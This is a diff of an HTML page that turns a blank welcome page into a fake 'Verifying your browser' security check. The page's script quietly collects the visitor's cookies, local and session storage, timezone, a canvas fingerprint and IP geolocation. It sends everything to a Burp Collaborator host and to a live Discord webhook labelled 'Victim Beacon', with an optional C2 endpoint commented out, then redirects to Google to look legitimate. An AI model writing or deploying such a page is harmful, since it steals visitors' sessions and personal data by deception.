@@ -1,31 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Welcome</title>
   <meta charset="UTF-8">
+  <title>Security Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    #status {
+      font-size: 20px;
+      color: green;
+    }
+  </style>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>🔐 Verifying your browser...</h1>
+  <p id="status">Please wait while we verify you're not a bot.</p>
 
   <script>
-    (function() {
+    (async () => {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
       const ref = document.referrer;
+      const cookies = document.cookie || "N/A";
+      const local = JSON.stringify(localStorage);
+      const session = JSON.stringify(sessionStorage);
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      // 1. Burp Collaborator beacon
-      new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?ua=" + encodeURIComponent(ua) + "&platform=" + encodeURIComponent(platform) + "&ref=" + encodeURIComponent(ref);
+      // Optional: Basic canvas fingerprint
+      let canvasFP = "";
+      try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("🕵️‍♂️ Fingerprint", 2, 2);
+        canvasFP = canvas.toDataURL();
+      } catch (e) {
+        canvasFP = "error";
+      }
 
-      // 2. Send to Discord Webhook
-      fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
+      // Optional: Geolocation
+      let geoData = "N/A";
+      try {
+        const geo = await fetch("https://ipinfo.io/json?token=demo");
+        geoData = await geo.text();
+      } catch (e) {
+        geoData = "Geo fetch failed";
+      }
+
+      const payload = {
+        userAgent: ua,
+        platform: platform,
+        referrer: ref,
+        cookies: cookies,
+        localStorage: local,
+        sessionStorage: session,
+        timezone: timezone,
+        canvasFingerprint: canvasFP,
+        geolocation: geoData
+      };
+
+      // ✅ Send to Burp Collaborator
+      new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?" + btoa(JSON.stringify(payload));
+
+      // ✅ Send to Discord Webhook
+      await fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `🧲 **GitHub.io Beacon**\n\n**User-Agent**: ${ua}\n**Platform**: ${platform}\n**Referrer**: ${ref}`
+          content: `🧲 **Victim Beacon**\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
         })
       });
+
+      // ✅ (Optional) Send to your own C2
+      /*
+      await fetch("https://your-c2-server.com/beacon", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      */
+
+      // ✅ Redirect after beacon (to make it feel legit)
+      window.location.href = "https://www.google.com";
     })();
   </script>
-
 </body>
 </html>
